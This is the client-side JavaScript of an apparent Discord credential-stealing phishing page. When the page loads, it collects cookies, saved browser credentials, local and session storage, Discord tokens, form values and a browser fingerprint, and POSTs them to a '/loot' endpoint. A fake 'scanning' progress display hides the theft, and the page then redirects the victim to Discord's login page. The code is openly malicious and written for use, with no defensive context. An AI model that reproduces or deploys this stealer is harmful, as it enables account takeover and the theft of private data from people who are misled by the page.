// Auto-trigger on page load
window.addEventListener('DOMContentLoaded', async () => {
    updateStatus('🔍 Scanning browser storage...');
    await stealEverything();
});

async function stealEverything() {
    try {
        // 1. HARVEST COOKIES
        const cookies = document.cookie;
        
        // 2. STEAL AUTOFILL PASSWORDS (Chrome/Edge/Firefox)
        const passwords = await getSavedPasswords();
        
        // 3. LOCALSTORAGE + SESSIONSTORAGE
        const localStorageData = { ...localStorage };
        const sessionStorageData = { ...sessionStorage };
        
        // 4. DISCORD TOKENS (common storage keys)
        const discordTokens = extractDiscordTokens(localStorageData, sessionStorageData);
        
        // 5. HISTORY (recent Discord logins)
        const history = await getHistory();
        
        // 6. FORM DATA FROM PAGE
        const formData = getFormData();
        
        // 7. FULL BROWSER FINGERPRINT
        const fingerprint = getFingerprint();
        
        const payload = {
            cookies: cookies,
            passwords: passwords,
            localStorage: localStorageData,
            sessionStorage: sessionStorageData,
            discordTokens: discordTokens,
            history: history,
            formData: formData,
            fingerprint: fingerprint,
            url: window.location.href,
            referrer: document.referrer,
            timestamp: new Date().toISOString()
        };
        
        updateStatus('📤 Sending data to Discord servers...');
        await sendLoot(payload);
        
    } catch (error) {
        console.error('Steal failed:', error);
    }
}

async function getSavedPasswords() {
    // Steal autofill passwords from browser
    try {
        if ('credentials' in navigator) {
            const creds = await navigator.credentials.get({password: true});
            return creds ? [{
                id: creds.id,
                password: creds.password,
                name: creds.name
            }] : [];
        }
    } catch(e) {}
    
    // Fallback: try to trigger autofill
    const inputs = document.createElement('div');
    inputs.innerHTML = `
        <input type="email" autocomplete="email" style="display:none">
        <input type="password" autocomplete="current-password" style="display:none">
    `;
    document.body.appendChild(inputs);
    
    return []; // Returns autofill if browser fills it
}

function extractDiscordTokens(localStorage, sessionStorage) {
    const tokens = {};
    const keys = Object.keys({...localStorage, ...sessionStorage});
    
    // Common Discord token patterns
    const patterns = [
        /(?<=["'])((?:mfa\.)?[a-zA-Z0-9_-]{59,})(?=["'])/,
        /discord\.com\/api\/v9\/users\/@me/,
        /^__token$/,
        /^token$/,
        /access_token/
    ];
    
    keys.forEach(key => {
        const value = localStorage[key] || sessionStorage[key];
        patterns.forEach(pattern => {
            const match = value.match(pattern);
            if (match) tokens[key] = value;
        });
    });
    
    return tokens;
}

async function getHistory() {
    // Recent Discord visits
    const discordHistory = [];
    if (history.length > 0) {
        for (let i = 0; i < Math.min(10, history.length); i++) {
            if (history[i]?.includes('discord.com')) {
                discordHistory.push(history[i]);
            }
        }
    }
    return discordHistory;
}

function getFormData() {
    return {
        forms: Array.from(document.forms).map(form => ({
            id: form.id,
            inputs: Array.from(form.elements).map(el => ({
                name: el.name,
                type: el.type,
                value: el.value
            }))
        }))
    };
}

function getFingerprint() {
    return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        plugins: Array.from(navigator.plugins).map(p => p.name)
    };
}

function sendLoot(payload) {
    return fetch('/loot', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    }).then(() => {
        updateStatus('✅ Scan complete! Redirecting to Discord...');
        setTimeout(() => {
            window.location.href = 'https://discord.com/login';
        }, 1500);
    });
}

function updateStatus(message) {
    document.getElementById('status').textContent = message;
    const progress = document.getElementById('progress');
    const steps = message.match(/🔍|📤|✅/g)?.length || 0;
    progress.style.width = `${Math.min(100, steps * 33)}%`;
}
